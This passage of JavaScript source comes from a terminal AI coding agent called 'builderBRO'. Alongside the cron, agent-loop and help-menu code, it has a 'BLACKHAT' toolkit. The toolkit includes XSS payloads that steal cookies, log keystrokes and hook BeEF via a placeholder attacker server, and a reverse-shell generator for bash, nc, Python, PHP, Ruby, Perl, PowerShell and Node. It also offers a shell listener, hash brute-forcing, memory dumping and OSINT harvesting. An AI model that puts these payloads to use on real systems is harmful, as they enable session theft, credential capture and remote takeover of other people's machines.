  if(job.parsed.type==="at"){var d=new Date();d.setHours(job.parsed.h,job.parsed.m,0,0);if(d.getTime()<=Date.now())d.setDate(d.getDate()+1);return d.getTime();}
  return Date.now()+3600000;
}
function startCron(){
  if(cronTimer)return;
  cronJobs.forEach(function(j){j.nextRun=nextCronAt(j);});
  cronTimer=setInterval(function(){
    var now=Date.now();
    cronJobs.forEach(function(j){
      if(!j.enabled)return;
      if(!j.nextRun||now<j.nextRun)return;
      j.nextRun=nextCronAt(j);
      try{var res=TOOLS.exec(j.cmd);j.lastResult=res.substring(0,200);j.lastRun=now;j.runs=(j.runs||0)+1;}
      catch(e){j.lastResult="ERR: "+e.message;j.lastRun=now;}
      if(j.notify&&typeof tgNotify==="function")tgNotify("Cron: "+j.name+" -> "+(j.lastResult||"").substring(0,100));
    });
    saveCron();
  },15000);
}

// --- BLACKHAT SCAN HISTORY ---
var SCAN_LOG_F=join(DATA_DIR,"scanlog.json");var scanLog;
try{scanLog=JSON.parse(readFileSync(SCAN_LOG_F,"utf8"));}catch(e){scanLog=[];}
function saveScanLog(){try{writeFileSync(SCAN_LOG_F,JSON.stringify(scanLog,null,2),"utf8");}catch(e){}}
function addScan(result){scanLog.unshift(Object.assign({time:Date.now()},result));if(scanLog.length>100)scanLog=scanLog.slice(0,100);saveScanLog();}
// --- REVERSE SHELL STATE ---
var SHELL_SESSIONS_F=join(DATA_DIR,"shells.json");var shells;
try{shells=JSON.parse(readFileSync(SHELL_SESSIONS_F,"utf8"));}catch(e){shells=[];}
function saveShells(){try{writeFileSync(SHELL_SESSIONS_F,JSON.stringify(shells,null,2),"utf8");}catch(e){}}
// --- BRUTE SESSIONS ---
var BRUTE_F=join(DATA_DIR,"brute.json");var bruteSessions;
try{bruteSessions=JSON.parse(readFileSync(BRUTE_F,"utf8"));}catch(e){bruteSessions=[];}
function saveBrute(){try{writeFileSync(BRUTE_F,JSON.stringify(bruteSessions,null,2),"utf8");}catch(e){}}
// --- COMMON HASHES / WORDLIST GEN ---
function hashGen(algo,word){return createHash(algo||"sha256").update(word).digest("hex");}
function wordlistGen(base,patterns){var words=[base,base.toUpperCase(),base.toLowerCase(),base+"123",base+"1234",base+"12345",base+"!",base+"@123",base+"#123",base+"2024",base+"2025",base+"2026",base+"1",base+"12"];if(patterns)patterns.forEach(function(p){words.push(base+p);});return words;}
// --- XSS PAYLOADS ---
var XSS_PAYLOADS={
basic:'<script>alert("XSS")</script>',
img:'<img src=x onerror=alert("XSS")>',
svg:'<svg onload=alert("XSS")>',
body:'<body onload=alert("XSS")>',
input:'<input onfocus=alert("XSS") autofocus>',
details:'<details open ontoggle=alert("XSS")>',
iframe:'<iframe src="javascript:alert(\'XSS\')">',
style:'<style>@keyframes x{}</style><div style="animation-name:x" onanimationend=alert("XSS")>',
a:'<a href="javascript:alert(\'XSS\')">click</a>',
steal:'<img src=x onerror="fetch(\'https://YOURSERVER/steal?c=\'+document.cookie)">',
beef:'<script src="https://YOURSERVER/hook.js"></script>',
keylog:'<script>document.onkeypress=function(e){fetch("https://YOURSERVER/k?k="+e.key);}</script>',
redirect:'<script>location.href="https://YOURSERVER/phish"</script>',
deface:'<script>document.body.innerHTML="<h1>PWNED</h1>";</script>',
session:'<img src=x onerror="var i=new Image();i.src=\'https://YOURSERVER/s?\'+document.cookie;">',
portscan:'<script>for(var i=1;i<1024;i++){new Image().src="http://localhost:"+i+"/"+i;}</script>'
};
// --- SHELL PAYLOAD GEN ---
function genShellPayload(type,host,port){
  var payloads={
    bash:'bash -i >& /dev/tcp/'+host+'/'+port+' 0>&1',
    nc:'nc -e /bin/sh '+host+' '+port,
    nc2:'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+host+' '+port+' >/tmp/f',
    python:'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("'+host+'",'+port+'));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'',
    php:'php -r \'$s=fsockopen("'+host+'",'+port+');exec("/bin/sh -i <&3 >&3 2>&3");\'',
    ruby:'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("'+host+'","'+port+'");loop{c.gets.chomp!;(c.puts(eval($_))rescue nil)}\'',
    perl:'perl -e \'use Socket;$i="'+host+'";$p='+port+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'',
    powershell:'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient(\''+host+'\','+port+');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}$c.Close()"',
    node:'node -e "var net=require(\'net\');var sh=require(\'child_process\').exec(\'/bin/sh\');var c=new net.Socket();c.connect('+port+',\''+host+'\',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});"'
  };
  return payloads[type]||payloads.bash;
}
var SLISTEN=false;var sServer=null;var sShells=[];
function stopShellListener(){if(sServer){try{sServer.close();}catch(e){}}SLISTEN=false;sServer=null;}
// --- ENCODE / DECODE UTILS ---
function rot13(s){return s.replace(/[a-zA-Z]/g,function(c){var b=c<="Z"?65:97;return String.fromCharCode(b+(c.charCodeAt(0)-b+13)%26);});}
var MORSE={A:".-",B:"-...",C:"-.-.",D:"-..",E:".",F:"..-.",G:"--.",H:"....",I:"..",J:".---",K:"-.-",L:".-..",M:"--",N:"-.",O:"---",P:".--.",Q:"--.-",R:".-.",S:"...",T:"-",U:"..-",V:"...-",W:".--",X:"-..-",Y:"-.--",Z:"--..","0":"-----","1":".----","2":"..---","3":"...--","4":"....-","5":".....","6":"-....","7":"--...","8":"---..","9":"----."," ":"/"};
var REV_MORSE={};Object.keys(MORSE).forEach(function(k){REV_MORSE[MORSE[k]]=k;});
function strToMorse(s){return s.toUpperCase().split("").map(function(c){return MORSE[c]||c;}).join(" ");}
function morseToStr(s){return s.trim().split(/\s+/).map(function(c){return REV_MORSE[c]||c;}).join("");}
// --- SIMPLE WHOIS ---
function whoisLookup(domain){return TOOLS.exec("whois "+domain.replace(/[^a-zA-Z0-9.-]/g,""));}
// --- PORT SCAN ---
function scanPort(host,port,cb){try{var s=createConnection({host:host,port:port,timeout:3000},function(){s.destroy();cb(null,true);});s.on("error",function(){s.destroy();cb(null,false);});}catch(e){cb(e,false);}}
function scanPortSync(host,port){return new Promise(function(ok){scanPort(host,port,function(e,r){ok(r);});});}
// --- DNS RESOLVE ---
function dnsLookup(domain,type){return new Promise(function(ok){var d=domain.replace(/[^a-zA-Z0-9.-]/g,"");if(type==="A"||type==="AAAA"||!type){lookup(d,{all:true},function(e,addr){if(e){ok(["ERR: "+e.message]);return;}ok(Array.isArray(addr)?addr.map(function(a){return a.address+(a.family?" (v"+a.family+")":"");}):[String(addr)]);});}else if(type==="MX"){resolveMx(d,function(e,r){if(e){ok(["ERR: "+e.message]);return;}ok(r?r.map(function(x){return x.priority+" "+x.exchange;}):[]);});}else if(type==="NS"){resolveNs(d,function(e,r){ok(r||["ERR: "+(e?e.message:"none")]);});}else if(type==="TXT"){resolveTxt(d,function(e,r){if(e){ok(["ERR: "+e.message]);return;}ok(r?r.flat().slice(0,10):[]);});}else if(type==="CNAME"){resolveCname(d,function(e,r){ok(r||["ERR: "+(e?e.message:"none")]);});}else if(type==="SOA"){resolveSoa(d,function(e,r){ok(r?[JSON.stringify(r)]:["ERR: "+(e?e.message:"none")]);});}else{ok(["Unknown type: "+type]);}});}
// --- SNIFF / NETSTAT PARSER ---
function parseNetDev(){
  // Parse /proc/net/dev on Linux
  var out=TOOLS.exec("cat /proc/net/dev 2>/dev/null || echo ''").trim();
  var ifaces=[];
  var lines=out.split("\n");
  for(var i=2;i<lines.length;i++){
    var l2=lines[i].trim();
    if(!l2)continue;
    var colon=l2.indexOf(":");
    if(colon<0)continue;
    var name=l2.substring(0,colon).trim();
    var parts=l2.substring(colon+1).trim().split(/\s+/);
    if(parts.length<16)continue;
    ifaces.push({name:name,rxBytes:parseInt(parts[0])||0,rxPackets:parseInt(parts[1])||0,rxErrs:parseInt(parts[2])||0,rxDrops:parseInt(parts[3])||0,txBytes:parseInt(parts[8])||0,txPackets:parseInt(parts[9])||0,txErrs:parseInt(parts[10])||0,txDrops:parseInt(parts[11])||0});
  }
  return ifaces;
}
function formatBytes(b){if(b<1024)return b+"B";if(b<1048576)return (b/1024).toFixed(1)+"KB";if(b<1073741824)return (b/1048576).toFixed(1)+"MB";return (b/1073741824).toFixed(2)+"GB";}
function parseNetStat(){
  // Parse /proc/net/snmp Tcp + Udp
  var out=TOOLS.exec("cat /proc/net/snmp 2>/dev/null || echo ''").trim();
  var result={tcp:{},udp:{}};
  var tcpMode=false,udpMode=false;
  var tcpKeys=[],udpKeys=[];
  out.split("\n").forEach(function(l){
    if(l.startsWith("Tcp:")){var tk=l.substring(4).trim().split(/\s+/);if(tcpKeys.length){for(var ki=0;ki<Math.min(tcpKeys.length,tk.length);ki++)result.tcp[tcpKeys[ki]]=tk[ki];}else{tcpKeys=tk;}}else if(l.startsWith("Udp:")){var uk=l.substring(4).trim().split(/\s+/);if(udpKeys.length){for(var ki=0;ki<Math.min(udpKeys.length,uk.length);ki++)result.udp[udpKeys[ki]]=uk[ki];}else{udpKeys=uk;}}
  });
  return result;
}
function parseNetStatTcp(){
  var snmp=parseNetStat();
  return {inSegs:parseInt(snmp.tcp.InSegs)||0,outSegs:parseInt(snmp.tcp.OutSegs)||0,retrans:parseInt(snmp.tcp.RetransSegs)||0,estab:parseInt(snmp.tcp.CurrEstab)||0,activeOpens:parseInt(snmp.tcp.ActiveOpens)||0,passiveOpens:parseInt(snmp.tcp.PassiveOpens)||0,failedConns:parseInt(snmp.tcp.AttemptFails)||0,resetRcvd:parseInt(snmp.tcp.EstabResets)||0};
}
function parseArpTable(){
  var out=TOOLS.exec("cat /proc/net/arp 2>/dev/null || echo ''").trim();
  var entries=[];
  out.split("\n").slice(1).forEach(function(l){
    var p=l.trim().split(/\s+/);
    if(p.length>=6)entries.push({ip:p[0],hwtype:p[1],flags:p[2],mac:p[3],mask:p[4],iface:p[5]});
  });
  return entries;
}
function parseListeningPorts(){
  var out=TOOLS.exec("ss -tlnp 2>/dev/null | head -40 || netstat -tlnp 2>/dev/null | head -40 || echo ''").trim();
  return out;
}
// --- ARP SWEEP + OUI LOOKUP ---
var OUI_CACHE={};
function getOUI(mac){
  var prefix=mac.replace(/[^0-9A-Fa-f]/g,'').substring(0,6).toUpperCase();
  if(OUI_CACHE[prefix])return OUI_CACHE[prefix];
  var known={
    "FCA841":"Apple","001DD8":"Apple","0050C2":"Apple","001EC2":"Apple",
    "3C5AB4":"Google","98D6BB":"Google","54A050":"Google",
    "70B3D5":"Samsung","7CFC16":"Samsung","CC05E8":"Samsung",
    "DCA632":"Samsung","00A069":"Samsung",
    "BCAEC5":"ASUS","08BFB8":"ASUS","10BF48":"ASUS",
    "7C101C":"Xiaomi","FCC233":"Xiaomi","642B80":"Xiaomi",
    "28D244":"Huawei","5C85C9":"Huawei","7C6097":"Huawei",
    "001315":"Cisco","7CAD74":"Cisco","0086A0":"Cisco","001C58":"Cisco",
    "080027":"VirtualBox","0A0027":"VirtualBox",
    "005056":"VMware","000C29":"VMware",
    "525400":"QEMU","FE5400":"docker",
    "D43D7E":"Dell","001EC1":"Dell","B8AC6F":"Dell",
    "001E0B":"HP","001CC4":"HP","3CD92B":"HP",
    "001AA0":"Intel","00163E":"Intel","001F3B":"Intel",
    "B827EB":"RaspberryPi","DCA632":"RaspberryPi",
    "001122":"Brother","008077":"Brother",
    "001A4B":"Canon","008092":"Canon",
    "001E8C":"Epson","0000E8":"Epson",
    "3432B4":"Nest","641666":"Nest",
    "00183A":"Ring","8CF710":"Ring",
    "0016B6":"Roku","B0A737":"Roku",
    "0022D7":"LG","F4F26D":"LG","C4E17C":"LG",
    "0024BA":"Sony","104FA8":"Sony","544249":"Sony",
    "0017F2":"Nintendo","9822EF":"Nintendo",
    "00225F":"Microsoft","28E02C":"Microsoft",
    "001B63":"Netgear","9C3DCF":"Netgear","E4F4C6":"Netgear",
    "001D7E":"TP-Link","F4F26D":"TP-Link","50C7BF":"TP-Link",
    "002590":"D-Link","1C7EE5":"D-Link","F07D68":"D-Link",
    "0011D8":"Asustek","1043F7":"Asustek",
    "0000DE":"Synology","001132":"Synology",
    "001EC0":"Ubiquiti","04D4C4":"Ubiquiti","24A43C":"Ubiquiti"
  };
  OUI_CACHE[prefix]=known[prefix]||null;
  return OUI_CACHE[prefix];
}
function arpSweep(subnet){
  // subnet like "192.168.1" — pings every host in /24
  // Returns array of {ip, mac, vendor, ms}
  var base=subnet.replace(/[^0-9.]/g,'');
  var results=[];
  for(var i=1;i<=254;i++){
    var ip=base+'.'+i;
    var out=TOOLS.exec("ping -c 1 -W 1 "+ip+" 2>/dev/null | head -4; arp -n "+ip+" 2>/dev/null | tail -1 | awk '{print $3}'").trim();
    var lines=out.split('\n');
    var alive=lines.some(function(l){return l.indexOf('bytes from')>=0||l.indexOf('1 received')>=0;});
    if(alive){
      var macLine=lines[lines.length-1]||'';
      var mac=macLine.match(/([0-9A-Fa-f]{1,2}[:-]){5}[0-9A-Fa-f]{1,2}/);
      var ms=out.match(/time[=<]([0-9.]+)\s*ms/);
      results.push({ip:ip,mac:mac?mac[0]:'?',vendor:mac?getOUI(mac[0]):null,ms:ms?parseFloat(ms[1]):null});
    }
  }
  return results;
}
function getSubnetPrefix(){
  var out=TOOLS.exec("ip addr show 2>/dev/null | grep 'inet ' | grep -v 127.0.0.1 | head -1 | awk '{print $2}'").trim();
  if(out){var parts=out.split('/')[0].split('.');return parts.slice(0,3).join('.');}
  return '192.168.1';
}
var arpLastScan=null;
var arpScanning=false;
// --- SHARED STATE ---
var lastOutput="";

async function agentLoop(input) {
  chatLog.push({ role: "user", parts: [{ text: input }] });
  if (typeof memorize === "function") memorize("observation", "User: " + input.substring(0, 200), { from: "terminal" });

  activeSkillContext = matchCustomSkillPrompts(input);
  if (activeSkillContext) {
    var activatedNames = customSkills.filter(function(s){
      return s.enabled && Array.isArray(s.triggers) && s.triggers.some(function(t){ return t && input.toLowerCase().includes(t.toLowerCase()); });
    }).map(function(s){ return s.name; });
    console.log(p("dim","  \u26A1 skill active: "+activatedNames.join(", ")));
  }

  var ctrl = new AbortController();
  currentTurnAbort = ctrl;
  try {
    spin("BRO thinking", "thinking");
    var resp;
    try {
      resp = await askChat(chatLog, undefined, ctrl.signal);
    } catch(e) {
      unspin();
      if (e.userStopped) { console.log(p("yellow","\n  \u23F9  Turn stopped.\n")); return; }
      console.log(p("red","x "+e.message));
      return;
    }
    unspin();

    var text = resp.content;

    // Add BRO's response to the ongoing log so it remembers what it said
    chatLog.push({ role: "model", parts: [{ text: text }] });

    // Keep chat log from growing infinitely and hitting context limits
    if (chatLog.length > 40) chatLog = chatLog.slice(-40);

    var depth=0;
    var failureSignatures = {}; // tool+args -> fail count, tracked within this turn only
    while(depth<MAX_DEPTH){
      var calls=extractT(text);
      if(!calls.length)break;
      var cl=cln(text);
      if(cl)console.log("\n"+p("yellow",cl));

      var results=await runT(calls);
      if (ctrl.signal.aborted) { console.log(p("yellow","\n  \u23F9  Turn stopped.\n")); return; }
      var repeatedFailure = false;
      results.forEach(function(r){
        console.log("\n  "+(r.result.startsWith("ERR")?p("red","x"):p("green","v"))+" "+p("cyan",r.tool)+" "+p("dim",r.args.split("\n")[0].substring(0,60)+" "+r.ms+"ms"));
        console.log(r.result.substring(0,3000));
        if(r.result.startsWith("ERR")){
          dbg("toolError", r.tool+" args=\""+r.args.substring(0,200)+"\" -> "+r.result.substring(0,500));
          var sig = r.tool+"::"+r.args.trim();
          failureSignatures[sig] = (failureSignatures[sig]||0) + 1;
          if(failureSignatures[sig] >= 2) repeatedFailure = true;
        }
      });
      depth++;
      if(depth>=MAX_DEPTH)break;
      if(repeatedFailure){
        console.log(p("red","\n  \u26A0  Same tool call just failed the same way twice in a row - stopping instead of repeating it again. Try rephrasing what you want, or check /debug for the full error.\n"));
        dbg("repeatedFailure", "Stopped turn early: "+JSON.stringify(failureSignatures));
        break;
      }
      var rpt=results.map(function(r){return"["+r.tool+"]: "+r.result;}).join("\n\n");

      // Push the tool results as a user turn
      chatLog.push({ role: "user", parts: [{ text: "Results:\n" + rpt.substring(0,30000) }] });

      spin("BRO processing", "thinking");
      try {
        resp = await askChat(chatLog, undefined, ctrl.signal);
        unspin();
        text = resp.content;
        chatLog.push({ role: "model", parts: [{ text: text }] });
      } catch(e) {
        unspin();
        if (e.userStopped) { console.log(p("yellow","\n  \u23F9  Turn stopped.\n")); return; }
        break;
      }
    }
    var fin = cln(text);
    if(fin) console.log("\n" + p("yellow", fin));
    console.log(p("dim", "  " + resp.elapsed + "s / " + resp.tokens + "tok\n"));
    if (typeof memorize === "function" && fin) memorize("observation", "BRO: " + fin.substring(0, 200), { from: "terminal" });
    saveSession(chatLog);
  } finally {
    currentTurnAbort = null;
    escArmed = false;
    activeSkillContext = "";
  }
}

async function handleInput(input){

    if (input.trim() === "/paste") {
      isPasting = true;
      console.log(p("yellow", "\n--- PASTE MODE ON: Paste your content below. Type '/end' on a new line to send. ---\n"));
      return;
    }

    if (isPasting) {
      if (input.trim() === "/end") {
        isPasting = false;
        console.log(p("green", "\n--- Sending buffer to BRO... ---\n"));
        await agentLoop(pasteBuffer);
        pasteBuffer = "";
      } else {
        pasteBuffer += input + "\n";
      }
      return;
    }

input=input.trim();if(!input)return;saveH(input);
    if(input.startsWith("!")){trackCmd("!");console.log(TOOLS.exec(input.substring(1)));return;}
    var cmd=input.split(" ")[0].toLowerCase();trackCmd(cmd);
    if(cmd==="exit"||cmd==="quit"||cmd==="/exit"||cmd==="/quit"){rl.close();if(hbInterval)clearInterval(hbInterval);if(cronTimer)clearInterval(cronTimer);saveCron();stopPomodoro();if(tgPollTimer){clearInterval(tgPollTimer);await tgSend("\u{1F44B} BRO signing off");}if(!process.argv.includes("--skip-outro")){await nukeExit();}process.exit(0);return;}
    if(input==="/help"||input==="help"||input.startsWith("/help ")){
      var GG=rgb(255,215,0),BB="\x1b[1m",DD="\x1b[2m",RR="\x1b[0m",CCY="\x1b[36m",MMG="\x1b[35m",GGR="\x1b[32m";
      var hQ=input.length>5?input.substring(5).trim().toLowerCase():"";
      console.log("");
      console.log("  "+GG+BB+"\u{1F339} builderBRO"+RR+DD+"  v2.0  â€¢  AI coding partner"+RR);
      if(hQ)console.log(DD+"  Search: \""+hQ+"\""+RR);
      console.log("");
      var HELP_GROUPS=[
        ["\u{1F4AC} CHAT",[["just type","talk to BRO"],["paste code","review/fix/explain"],["echo X | bro Q","pipe content"]]],
        ["\u{1F527} CORE",[["/help [q]","this menu, optional search"],["/status","system status"],["/stats","usage stats"],["/sys","CPU, RAM, disk, OS info"],["/calc EXPR","quick arithmetic"],["/tokens","API keys"],["/log","activity"],["/debug","crashes + tool errors"],["/intro","replay intro"],["/heartbeat","health check"]]],
        ["\u{1F9E0} MEMORY",[["/memory","stats"],["/memory search Q","search"],["/memory surface [Q]","surface relevant"],["/dream","trigger"],["/dream list","all dreams"]]],
        ["\u{1F4AA} SKILLS",[["/skills","picker"],["/skills toggle ID","on/off"],["/skills create","wizard"],["/skills list","all"]]],
        ["\u{1F916} PERSONA",[["/persona wizard","create a persona"],["/persona list","all personas"],["/persona set ID","activate persona"],["/persona enable/disable ID","toggle"],["/persona delete ID","remove"]]],
        ["\u{1F339} BROMANCE  118+ connectors",[["/bromance","picker"],["/bromance search Q","search"],["/bromance browse TYPE","mcp/llm/api/tunnel/agent"],["/bromance discover Q","live web"],["/bromance install ID","install"],["/bromance list","installed"]]],
        ["\u{1F680} BUILD",[["/build","wizard"],["/build IDEA","one-shot: 'build me a landing page'"],["/builds","history of past builds"]]],
        ["\u{1F916} AUTOPILOT",[["/auto","menu"],["/auto add CMD","add task"],["/auto from-pattern","learn habits"],["/auto on","start"],["/auto off","stop"]]],
        ["\u{1F4F1} TELEGRAM",[["/tg","menu"],["/tg setup TOK CID","configure"],["/tg on|off","toggle bridge"],["/tg send MSG","push to phone"],["/tg keyboard","inline buttons"],["/tg groups","list known groups"],["/tg approve ID","allow group broadcasts"],["/tg broadcast MSG","message all approved groups"]]],
        ["\u{26D3}\uFE0F  CHAIN",[["/chain","build chain"],["/brotime","session recap"],["/brofile","project DNA"]]],
        ["\u{1F419} GITHUB",[["/gh","menu"],["/gh default OWNER/REPO","set default repo"],["/gh repo [OWNER/REPO]","repo info"],["/gh prs [OWNER/REPO]","open PRs"],["/gh issues [OWNER/REPO]","open issues"],["/gh checks [OWNER/REPO]","CI checks"],["/gh file PATH","read a file"]]],
        ["\u{1F680} K1 OPS",[["/k1 scan","full audit"],["/k1 git","status + commits"],["/k1 diff","git diff"],["/k1 deploy","Vercel"],["/k1 secrets","scan keys"],["/k1 review F","code AI"]]],
        ["\u{1F30D} WEB",[["/web","status"],["/web open URL","open a page"],["/web search Q","one-shot search"],["/web text","page content"],["/web click N","click element"],["/web type N TEXT","type into field"],["/web shot","screenshot"]]],
        ["\u{1F4C2} FILE OPS",[["/rename DIR prefix|.old.new|num|lower|UPPER","batch rename"],["/dupes [DIR]","find duplicate files"],["/archive DIR","tar.gz archive"],["/extract FILE","extract archive"],["/diff2 A B","side-by-side diff"],["/hex FILE","hex dump viewer"],["/media FILE","media info (img/audio)"]]],
        ["\u{1F4CB} PRODUCTIVITY",[["/kanban","view board"],["/kanban add TITLE|COLUMN","new card"],["/kanban done ID","complete card"],["/kanban move ID COLUMN","move card"],["/time start TASK","start tracking"],["/time stop","stop tracking"],["/time","view time log"],["/journal [DATE]","read entry"],["/journal add DATE TEXT","write entry"],["/standup","daily template"],["/standup log TEXT","record standup"]]],
        ["\u{1F9E0} AGENTIC SELF",[["/self","metrics dashboard"],["/self goals","view goals"],["/self goals add TITLE","create goal"],["/self goals done ID","complete goal"],["/self goals prioritize ID N","set priority 1-10"],["/self goals progress ID N","update %"],["/self reflect [Q]","introspect & surface patterns"],["/self improve","optimize & self-heal"]]],
        ["\u{1F4CB} QUICK TOOLS",[["/marks","list saved dirs"],["/marks add NAME path","bookmark a dir"],["/marks go NAME","jump to bookmark"],["/alias add NAME CMD","create shortcut"],["/alias list / del","manage aliases"],["/todo / add / done / clear","task tracker"],["/notes / add / search / del","quick notes"],["/env / env set KEY=VAL","env vars"],["/diff","git diff"],["/calc EXPR","5+3*2"],["/history search Q","search history"],["/pomo 25 / pomo stop","focus timer"]]],
        ["\u{1F916} UTILITIES",[["/sys","CPU, RAM, OS info"],["/size [dir]","directory size"],["/top","process listing"],["/net","network interfaces"],["/hash ALGO TEXT","md5/sha1/sha256/sha512"],["/uuid","generate UUID v4"],["/port N","check port"],["/json PATH","pretty-print JSON"],["/b64 enc|dec TEXT","base64"],["/http URL [body]","GET/POST request"],["/which CMD","find in PATH"],["/reload","reload state from disk"]]],
        ["\u{1F550} CRON",[["/cron","list jobs"],["/cron add NAME 'every 5m' CMD","schedule"],["/cron add NAME 'at 09:00' CMD","daily job"],["/cron del ID","remove"],["/cron on|off ID","toggle"],["/cron log","execution log"]]],
        ["\u2620 BLACKHAT",[["/scan HOST 1-1024","port scanner"],["/scan HOST 22,80,443","scan specific"],["/scan log","scan history"],["/whois DOMAIN","domain info"],["/dns DOMAIN [A|MX|NS|TXT]","DNS lookup"],["/ping HOST","latency check"],["/traceroute HOST","hop trace"],["/ssl DOMAIN","certificate info"],["/headers URL","HTTP headers"],["/ip [IP]","geolocation lookup"],["/banner HOST:PORT","grab service banner"],["/encode rot13|hex|url|morse","encode/decode"],["/genpass [LEN]","generate password"],["/brute crack HASH WORD [ALGO]","hash cracker (Hydra)"],["/brute dict WORD","common password gen"],["/brute wordlist WORD","mutations"],["/hook gen TYPE SERVER","XSS payloads (BeEF)"],["/hook list","all XSS types"],["/slave listen PORT","reverse shell listener"],["/slave gen TYPE HOST PORT","shell payloads"],["/slave sessions","active shells"],["/memdump strings PID","RAM string dump"],["/memdump proc","process listing"],["/harvest email NAME SITE","OSINT emails"],["/harvest gh USER","GitHub recon"],["/harvest dns DOMAIN","subdomain enum"],["/harvest social USER","username search"],["/harvest meta URL","metadata scraper"],["/sniff stats","iface RX/TX counters"],["/sniff live [IFACE] [SECS]","live PPS monitor"],["/sniff tcp","TCP stats + retransmits"],["/sniff arp","ARP table"],["/sniff listen","listening services"],["/sniff top","top talkers by bytes"],["/arp sweep [SUBNET]","/24 host discovery"],["/arp sweep live","continuous watch"],["/arp table","ARP cache with OUI"],["/arp vendor","known vendor list"]]],
        ["\u{1F4B0} TIER",[["/tier","current"],["/upgrade","options"],["/upgrade KEY","activate"]]],
        ["\u{1F44B} EXIT",[["exit / quit","BRO out"]]]
      ];
      HELP_GROUPS.forEach(function(grp){
        var rows=grp[1];
        if(hQ){rows=rows.filter(function(r){return r[0].toLowerCase().includes(hQ)||r[1].toLowerCase().includes(hQ);});if(!rows.length)return;}
        console.log(MMG+BB+"  "+grp[0]+RR);
        rows.forEach(function(r){var pad=r[0].length<28?" ".repeat(28-r[0].length):"  ";var c=r[0].startsWith("/")?CCY:GGR;console.log("  "+c+r[0]+RR+pad+DD+r[1]+RR);});
        console.log("");
      });
      if(!hQ)console.log(DD+"  tip: "+RR+CCY+"/help search"+RR+DD+" filters. "+RR+CCY+"/bromance"+RR+DD+" for 118+ tools."+RR+"\n");
      return;
    }
    if(input==="/build"||input==="/b"){rl.pause();await buildWizard("",askChat,rl);rl.resume();return;}
    if(input.startsWith("/build ")){rl.pause();await buildWizard(input.substring(7).trim(),askChat,rl);rl.resume();return;}
    if(input.startsWith("/b ")){rl.pause();await buildWizard(input.substring(3).trim(),askChat,rl);rl.resume();return;}
    if(input==="/builds"){showBuildHistory();return;}
    if(input==="/tier"||input==="/plan"){broTierShow();return;}
    if(input==="/upgrade"){broTierShow();return;}
    if(input.startsWith("/upgrade ")){broTierActivate(input.substring(9).trim());return;}
    if(input==="/status"){await showStatus();return;}
    if(input==="/stats"){showStats();return;}
    if(input==="/memory"){
      console.log(p("yellow","\n  \u{1F9E0} MEMORY"));
      console.log(p("cyan","  Facts: ")+memory.facts.length);
      console.log(p("cyan","  Observations: ")+memory.observations.length);
      console.log(p("cyan","  Decisions: ")+memory.decisions.length);
      console.log(p("cyan","  Errors: ")+memory.errors.length);
      console.log(p("cyan","  Total: ")+memory.total_interactions+"\n");
      return;
    }
    if(input.startsWith("/memory search ")){
      var mq=input.substring(15).trim().toLowerCase();
      var allEntries=[].concat(
        memory.facts.map(function(e){return{type:"fact",e:e};}),
        memory.observations.map(function(e){return{type:"observation",e:e};}),
        memory.decisions.map(function(e){return{type:"decision",e:e};}),
        memory.errors.map(function(e){return{type:"error",e:e};})
      );
      var hits=allEntries.filter(function(x){return x.e.text.toLowerCase().includes(mq);});
      console.log(p("yellow","\n  \u{1F9E0} MEMORY SEARCH: \""+mq+"\""));
      if(!hits.length)console.log(p("dim","  No matches.\n"));
      else{hits.slice(-15).forEach(function(x){console.log(p("cyan","  ["+x.type+"] ")+x.e.text.substring(0,120));});console.log("");}
      return;
    }
    if(input==="/memory surface"||input.startsWith("/memory surface ")){
      var sq=input.length>15?input.substring(15).trim():"";
      console.log(p("yellow","\n  \u{1F9E0} SURFACING RELEVANT MEMORY"));
      var ctx=buildMemoryContext();
      console.log(ctx?p("dim",ctx):p("dim","  Nothing relevant yet.\n"));
      return;
    }
    if(input==="/tokens"){console.log(p("yellow","\n  Base44: ")+p("dim",TOKEN.substring(0,30)+"..."));console.log(p("yellow","  Groq:   ")+p("dim",GROQ_KEY.substring(0,15)+"...\n"));return;}
    if(input==="/log"){try{console.log(p("dim","\n"+readFileSync(LOG_F,"utf8").split("\n").slice(-20).join("\n")+"\n"));}catch{console.log(p("dim","\n  No log yet.\n"));}return;}
    if(input==="/debug"){
      try{
        var dbgLines=readFileSync(DEBUG_F,"utf8").split("\n").filter(Boolean);
        if(!dbgLines.length){console.log(p("dim","\n  No debug entries yet.\n"));return;}
        console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F41E} DEBUG LOG"+RST+p("dim"," (last 15 of "+dbgLines.length+")"));
        dbgLines.slice(-15).forEach(function(l){console.log(p("dim",l.substring(0,300)));});
        console.log(p("dim","\n  /debug clear to reset\n"));
      }catch{console.log(p("dim","\n  No debug entries yet.\n"));}
      return;}
    if(input==="/debug clear"){try{writeFileSync(DEBUG_F,"","utf8");console.log(p("green","  Cleared.\n"));}catch(e){console.log(p("red","  "+e.message+"\n"));}return;}
    if(input==="/intro"){rl.pause();await intro();rl.resume();console.log(rgb(255,215,0)+BOLD+"\n  builderBRO v3.0"+RST+"\n");return;}
    if(input==="/heartbeat"){await runHeartbeat(false);return;}
    if(input==="/skills create"){rl.pause();await skillsCreateWizard(rl);rl.resume();return;}
    if(input==="/skills"){
      // Preselect currently enabled skills (built-in + custom)
      var combined = allSkills();
      var presel = [];
      combined.forEach(function(s, i) { if (s.enabled) presel.push(i); });
      
      rl.pause();
      var result = await interactiveSelect(combined, {
        title: "\u{1F339} BRO SKILLS â€” toggle with SPACE, confirm ENTER",
        multi: true,
        preSelected: presel
      });
      rl.resume();
      
      if (result !== null) {
        // Update enabled state based on selection
        var selectedIds = new Set(result.map(function(s) { return s.id; }));
        skills.forEach(function(s) { s.enabled = selectedIds.has(s.id); });
